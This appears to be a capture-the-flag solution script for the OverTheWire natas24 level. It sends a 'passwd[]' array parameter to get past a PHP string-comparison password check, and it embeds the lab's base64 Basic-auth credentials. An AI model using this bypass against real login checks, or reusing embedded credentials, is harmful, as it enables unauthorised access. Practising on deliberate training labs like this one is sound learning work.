import requests
import string

length = 32

headers = {
    'Authorization': 'Basic bmF0YXMyNDpPc1JtWEZndW96S3BUWlo1WDE0ek5PNDMzNzlMWnZlZw=='
}

url = 'http://natas24.natas.labs.overthewire.org/?passwd[]'

request = requests.get(url=url, headers=headers)

print(request.content.decode('utf-8'))
